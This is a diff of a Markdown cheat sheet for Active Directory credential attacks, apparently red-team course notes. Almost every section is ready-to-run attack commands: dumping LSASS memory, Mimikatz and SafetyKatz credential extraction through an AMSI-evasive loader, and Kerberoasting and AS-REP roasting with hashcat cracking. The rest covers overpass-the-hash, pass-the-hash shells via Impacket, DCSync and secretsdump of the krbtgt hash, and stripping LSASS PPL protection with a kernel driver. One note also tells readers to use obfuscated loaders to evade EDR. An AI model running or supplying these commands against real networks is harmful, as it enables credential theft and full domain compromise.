@@ -5,33 +5,7 @@
 
 ---
 
-## Table of Contents
-
-- [LSASS & Credential Architecture](#lsass--credential-architecture)
-- [Credential Extraction Flow Diagram](#credential-extraction-flow-diagram)
-- [LSASS Dumping Methods (Live & Offline)](#lsass-dumping-methods-live--offline)
-- [Mimikatz & SafetyKatz Memory Extraction](#mimikatz--safetykatz-memory-extraction)
-- [Overpass-the-Hash (OPTH) Execution](#overpass-the-hash-opth-execution)
-- [DCSync Credential Replication](#dcsync-credential-replication)
-- [LSASS Protected Process Light (PPL) Bypass](#lsass-protected-process-light-ppl-bypass)
-
----
-
-## LSASS & Credential Architecture
-
-The **Local Security Authority Subsystem Service (LSASS)** (`lsass.exe`) manages local security policies and authenticates users.
-
-LSASS holds active credential material in memory:
-- Plaintext passwords (WDigest, SSP)
-- NTLM hashes (`sekurlsa::msv`)
-- Kerberos tickets & TGT session keys (`sekurlsa::tickets` / `sekurlsa::ekeys`)
-- DPAPI Master Keys (`sekurlsa::dpapi`)
-
-> **Source:** handwritten pp. 21–22.
-
----
-
-## Credential Extraction Flow Diagram
+## Credential Extraction Flow
 
 ```mermaid
 graph TD
@@ -50,26 +24,37 @@ graph TD
 
 ---
 
-## LSASS Dumping Methods (Live & Offline)
+## LSASS & Credential Architecture
+
+The **Local Security Authority Subsystem Service (LSASS)** (`lsass.exe`) manages local security policies and authenticates users.
+
+LSASS holds active credential material in memory:
+- Plaintext passwords (WDigest, SSP)
+- NTLM hashes (`sekurlsa::msv`)
+- Kerberos tickets & TGT session keys (`sekurlsa::tickets` / `sekurlsa::ekeys`)
+- DPAPI Master Keys (`sekurlsa::dpapi`)
+
+---
+
+## LSASS Dumping Methods
 
 > [!WARNING]
 > Dumping LSASS via direct API calls or `procdump.exe` is heavily monitored by AV/EDR. Use obfuscated loaders or indirect memory dumping where required.
 
-### 1. Task Manager (GUI)
+### Task Manager (GUI)
 - Open Task Manager → Details tab → Right-click `lsass.exe` → **Create dump file**.
 - Output saved to `C:\Users\<USER>\AppData\Local\Temp\lsass.dmp`.
 
-### 2. ProcDump (Sysinternals)
+### ProcDump (Sysinternals)
 ```cmd
 procdump.exe -accepteula -ma lsass.exe C:\AD\Tools\lsass.dmp
 ```
 
-### 3. Parse Dump File Offline (Mimikatz on Attacker Machine)
+### Parse Dump File Offline
 ```text
 mimikatz # sekurlsa::minidump C:\AD\Tools\lsass.dmp
 mimikatz # sekurlsa::logonpasswords
 ```
-> **Source:** handwritten pp. 53, 55–56.
 
 ---
 
@@ -81,72 +66,146 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 
 # SafetyKatz execution (Obfuscated Mimikatz wrapper with AMSI bypass)
 SafetyKatz.exe "sekurlsa::ekeys" "exit"
-```
 
-### AMSI Evasive Loader Pattern
-```cmd
 # Executing SafetyKatz via memory loader
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
 ```
-> [!NOTE]
-> **⚠ Verify from original:** Re-check exact loader argument names and `ekeys` / `evasive-keys` string on handwritten pp. 26–31.
-
-> **Source:** handwritten pp. 22, 26–31, 39, 56.
 
 ---
 
-## Overpass-the-Hash (OPTH) Execution
+## Kerberoasting
 
-Overpass-the-Hash requests a valid Kerberos TGT using an NTLM hash or AES key, requesting tickets from the KDC without performing traditional NTLM network authentication.
+Request TGS tickets for accounts with SPNs, then crack them offline.
 
+### Enumerate Kerberoastable Accounts
+```powershell
+# PowerView
+Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
+
+# AD Module
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
+
+### Rubeus
+```cmd
+Rubeus.exe kerberoast /stats
+Rubeus.exe kerberoast /user:<USER> /outfile:hashes.txt
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
+```
+
+### Impacket — GetUserSPNs
+```bash
+# Enumerate SPNs
+impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
+
+# Request TGS and dump crackable hashes
+impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
+```
+
+### Crack with Hashcat
+```bash
+hashcat -m 13100 kerberoast.txt wordlist.txt
+```
+
+---
+
+## AS-REP Roasting
+
+Target accounts with Kerberos pre-authentication disabled — no password needed to request an AS-REP.
+
+### Enumerate AS-REP Roastable Accounts
+```powershell
+# PowerView
+Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
+
+# AD Module
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
+```
+
+### Rubeus
+```cmd
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+Rubeus.exe asreproast /user:<USER> /format:hashcat /outfile:asrep.txt
+```
+
+### Impacket — GetNPUsers
+```bash
+# With credentials
+impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile asrep.txt
+
+# Without credentials (supply username list)
+impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
+```
+
+### Crack with Hashcat
+```bash
+hashcat -m 18200 asrep.txt wordlist.txt
+```
+
+---
+
+## Overpass-the-Hash (OPTH)
+
+Requests a valid Kerberos TGT using an NTLM hash or AES key instead of a plaintext password.
+
+### Mimikatz
 ```text
-# Mimikatz OPTH (Spawns new CMD process with injected Kerberos TGT context)
 sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:cmd.exe
 ```
 
+### Rubeus
 ```cmd
-# Rubeus OPTH (Standard TGT request & injection into current logon session)
+# Standard TGT request & injection
 Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /ptt
 
-# Rubeus Opsec / Elevated NetOnly Process Spawn
+# Opsec / Elevated NetOnly Process Spawn
 Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
-> **Source:** handwritten pp. 23–24, 27–29.
+
+### Impacket — psexec / wmiexec with hash
+```bash
+impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
+impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
+```
 
 ---
 
 ## DCSync Credential Replication
 
-DCSync uses Active Directory's Directory Replication Service Remote Protocol (`MS-DRSR` / DRSUAPI) to request account secrets directly from a DC.
+Uses Active Directory's Directory Replication Service (`MS-DRSR` / DRSUAPI) to request account secrets directly from a DC.
 
 > [!IMPORTANT]
-> **Prerequisites:** To execute DCSync, the account must hold explicit replication rights on the Domain Object:
-> - `DS-Replication-Get-Changes` (`Replicating Directory Changes`)
-> - `DS-Replication-Get-Changes-All` (`Replicating Directory Changes All`)
+> **Prerequisites:** The account must hold:
+> - `DS-Replication-Get-Changes`
+> - `DS-Replication-Get-Changes-All`
 
+### Mimikatz
 ```text
-# Dump krbtgt account hash (Used for Golden Ticket generation)
 lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt
-
-# Dump Domain Administrator hash
 lsadump::dcsync /user:<DOMAIN_SHORT>\Administrator
 ```
-> **Source:** handwritten pp. 24, 31.
+
+### Impacket — secretsdump
+```bash
+# With password
+impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
+
+# With NTLM hash
+impacket-secretsdump <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH>
+
+# Dump only specific user
+impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt
+```
 
 ---
 
 ## LSASS Protected Process Light (PPL) Bypass
 
-If LSASS is protected by LSA Protection (Protected Process Light / PPL), user-mode dumps will fail (`0x00000005 ACCESS DENIED`).
-
-Mimikatz requires kernel-level driver access (`mimidrv.sys`) to strip the PPL process protection flags.
+If LSASS is protected by LSA Protection (PPL), user-mode dumps will fail with `ACCESS DENIED`.
 
 ```text
-# Load Mimikatz Kernel Driver & Remove PPL from LSASS
 mimikatz # privilege::debug
 mimikatz # !drv::install C:\AD\Tools\mimidrv.sys
 mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # sekurlsa::logonpasswords
 ```
-
-> **Source:** handwritten p. 57.
